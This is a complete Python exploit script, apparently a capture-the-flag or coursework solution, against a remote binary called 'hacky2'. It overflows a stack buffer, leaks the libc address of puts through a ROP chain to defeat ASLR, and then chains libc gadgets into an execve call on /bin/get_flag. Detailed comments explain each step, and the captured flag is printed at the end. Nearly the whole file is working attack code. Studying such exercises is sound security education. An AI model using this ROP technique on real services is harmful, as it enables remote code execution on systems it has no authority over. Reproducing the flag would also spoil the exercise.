#!/usr/bin/python3

import sys
import socket
import time
from pwn import p64

#NOTE: relevant non-boilerplate code starts at line 80

#assign host and port to connect to
if len(sys.argv) >= 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    host = "hacky2"
    port = 13705

s = socket.socket()
s.connect((host, port))

local_debug = False


#functions to communicate with server (based on funtions from qual.py)
def dbg_print(txt):
    debug = False
    if debug:
        print(txt.decode('utf-8'))

def recv_until_timed(delim, timeout):
    global s
    if type(delim) is not bytes:
        delim = delim.encode('utf-8')
    tmp = b''
    starttime = time.time()
    if timeout <= 0:
        timeout = float('inf')
    while delim not in tmp and (time.time() - starttime) <= timeout:
            try:
                    r = s.recv(1)
                    if not r:
                            dbg_print(tmp)
                            return tmp
                    tmp += r
            except InterruptedError:
                    pass
    dbg_print(tmp)
    return tmp

def recv_until(delim):
    return recv_until_timed(delim, 0)

def recv_cnt_timed(count, timeout):
    global s
    tmp = b''
    starttime = time.time()
    if timeout <= 0:
        timeout = float('inf')
    while len(tmp) < count and (time.time() - starttime) <= timeout:
            try:
                    r = s.recv(1)
                    if not r:
                            dbg_print(tmp)
                            return tmp
                    tmp += r
            except InterruptedError:
                    pass
    dbg_print(tmp)
    return tmp

def recv_cnt(count):
    return recv_cnt_timed(count, 0)

def send(b):
    if type(b) is not bytes:
        b = b.encode('utf-8')
    s.send(b)


#The location of the sections .plt and .got.plt in memory are not affected by ASLR
#As a libc function puts has an entry in both tables:
# - the entry of puts in .plt contains code to jump to the address stored at .got.plt,
#   or invoke linker code to resolve the address of puts and store it in .got.plt
#   on the first invocation of puts
# - the entry of puts in .got.plt contains the actual address of puts in libc, once it
#   has been invoked for the first time.
#   Before that it points back to the second instruction of the corresponding .got.plt 
#   entry, in order to trigger the invocation of the linker code mentioned above
#This technique allows for addresses in dynamically linked libraries to be looked up
#only once they're needed.
#
#Since puts expects its argument in rdi, interprets whatever its finds at the memory 
#address provided in rdi as a dtring and prints it to stdout, we can use a ROP-Gadget
#'pop rdi ; ret' from our vuln binary, to copy the address stored in the .got.plt 
#entry of puts in rdi and printing it out by jumpint to the .plt address of puts.
#
#Since puts has already been invoked at the point we reach our ROP gadget, we also
#do not have to worry about moving an address pointing to .got.plt to rdi instead 
#of the actual libc address of puts we aim to leak.
#
#Lastly we cannot simply leak the libc address of puts, terminate the program and 
#make use of it at its next invokation, since it will not be the same due to ASLR
#being enabled.
#Hence we use the address of the main function (or alternatively a suitable address 
#located within the main function) to reinvoke get, which gives us the opportunity
#to place our actual exploit code, tailored to the relocated libc, in memory.
#
vuln_pop_rdi_gadget  = p64(0x40134b)
puts_got_entry_addr  = p64(0x4033d0)
puts_plt_entry_addr  = p64(0x401030)
main_addr            = p64(0x4010a0)

#In the end it doesn't really matter what we put in here during the first two 
#invokations of get, as long as we do not trigger any unwanted exit conditions,
#such as entering a number greater 0x400 in the first prompt.
send(b"Indeed.\n")
send(b"I tried so hard and got so far, but in the end it really didn't matter.\n");

#The last of the three get writes to tmp, which is a local variable inside the 
#main function containing a statically allocated buffer of size 42, and is hence 
#located on the stack.
#The input length of get is restricted to 0x80 bytes, which is still enough to 
#override the main function's return address and trigger a ROP chain in order to leak 
#the libc address of puts as described above.
#
#Fill 0x42 (=66) Bytes of statck starting at tmp to reach return address
libc_leak_exploit_str =  b"Compilin' Park oder so." + 0x2B*b"\x00" 
#Write first ROP chain to memory
libc_leak_exploit_str += vuln_pop_rdi_gadget
libc_leak_exploit_str += puts_got_entry_addr
libc_leak_exploit_str += puts_plt_entry_addr
libc_leak_exploit_str += main_addr
libc_leak_exploit_str += b'\n'

send(libc_leak_exploit_str)

recv_until('\n')
recv_until('\n')

#The output will contain the acual address of puts in memory.
libc_puts_addr_str = recv_until('\n')[4:10]

###########################################################
#LOCAL ADDRESSES FOR DEBUGGING with Debian GLIBC 2.36-9
if local_debug:
    libc_puts_offset = 0x77820
#Actual Values for libc 2.31 deployed on hacky2
else: 
    libc_puts_offset = 0x735f0
###########################################################

#We can now use the offset of the puts function obtained from the libc 2.31 binary 
#to calculate the base address of libc.
#Using a tool such as ROPgadget we can then obtain offsets for appropriate ROP 
#Gadgets in order to execute execve("/bin/get_flag").
libc_start_addr = int.from_bytes(libc_puts_addr_str, byteorder='little') - libc_puts_offset

###########################################################
#LOCAL ADDRESSES FOR DEBUGGING with Debian GLIBC 2.36-9
if local_debug:
    libc_ropgadget_pop_rax = p64(libc_start_addr + 0x3f0a7)
    libc_ropgadget_pop_rdi = p64(libc_start_addr + 0x27725)
    libc_ropgadget_pop_rsi = p64(libc_start_addr + 0x28ed9)
    libc_ropgadget_pop_rdx = p64(libc_start_addr + 0xfdc9d)
    libc_ropgadget_syscall = p64(libc_start_addr + 0x85fb1)
    libc_ropgadget_syscall_59 = p64(libc_start_addr + 0xd48d0)

    libc_string_bin_sh = p64(libc_start_addr + 0x196031)
    libc_ropgadget_mov_rdi_rbp_call_rax = p64(libc_start_addr + 0x9a470)
    libc_stdin_addr_str = p64(libc_start_addr + 0x1d1ec0)

    libc_system_addr_str = p64(libc_start_addr + 0x4c330)
#Actual Values for libc 2.31 deployed on hacky2
else:
    libc_ropgadget_pop_rdi    = p64(libc_start_addr + 0x23796)
    libc_ropgadget_pop_rsi    = p64(libc_start_addr + 0x2590f)
    libc_ropgadget_pop_rdx    = p64(libc_start_addr + 0xc8b8d)
    libc_ropgadget_syscall_59 = p64(libc_start_addr + 0xc9080)
###########################################################

#Now to the final trick:
#
#In order to invoke the /bin/get_flag binary directly, we have to place the string 
#"/bin/get_flag\x00" in memory, and pass its address to execve.
#Let's assume for a moment we placed that string in tmp. In that case it we would 
#need to leak the location of the stack first, since its location in memory has also 
#been randomized due to ASLR.
#
#One possible solution to this would've been to use the "/bin/sh" string available 
#within the libc binary, to invoke a shell, and use the shell to invoke /bin/get_flag.
#
#However, due to the nature of buf we have one more alternative:
#buf is a statically initialized global variable, and is hence contained in the .bss 
#section, which is unphased by ASLR as well. We can hence use the first two inputs, 
#in combination with the address of buf, to write the string "/bin/get_flag" to a known
#loction in memory, and then simply hardcode this address in our exploit
#
buf_addr = 0x403500

#Note that the ROP Chain can only by at most 62 bytes long, due to the size limitations 
#passed to the get function, but by returning to the execve function in libc instead
#of manually crafting our syscall, we can ommit the 'pop rax ; ret' geadget in order to
#set the syscall ID to 0x3b (=59), as it contains a hardcoded 'mov eax, 0x3b'-
exploit_str =  0x42*b"\x00"
exploit_str += libc_ropgadget_pop_rdi
exploit_str += p64(buf_addr + 8) #Offset 8 from buf needed to skip boolean is_ptr
exploit_str += libc_ropgadget_pop_rsi
exploit_str += p64(0)
exploit_str += libc_ropgadget_pop_rdx
exploit_str += p64(0)
exploit_str += libc_ropgadget_syscall_59
#Buffer Overflow in combination with this chain isn't long enough to return to main 
#afterwards, but once we have the flag we don't wanna do anything with vuln anyway, 
#so in the end, it doesn't really matter.
#I'm still leaving it in here anyway:
exploit_str += main_addr 
exploit_str += b"\n"

send(b"0\n")
send(b"/bin/get_flag\x00I had to fall to lose it all, but in the end it didn't really matter.\n")
send(exploit_str)

recv_until('\n')
recv_until('\n')
print(recv_until('\n').decode())

#
#flag_ca36eccce0942c99c3000c7e3167cf27
#Et voilá, ceci n'est pas une pipe, c'est un drapeau.
#


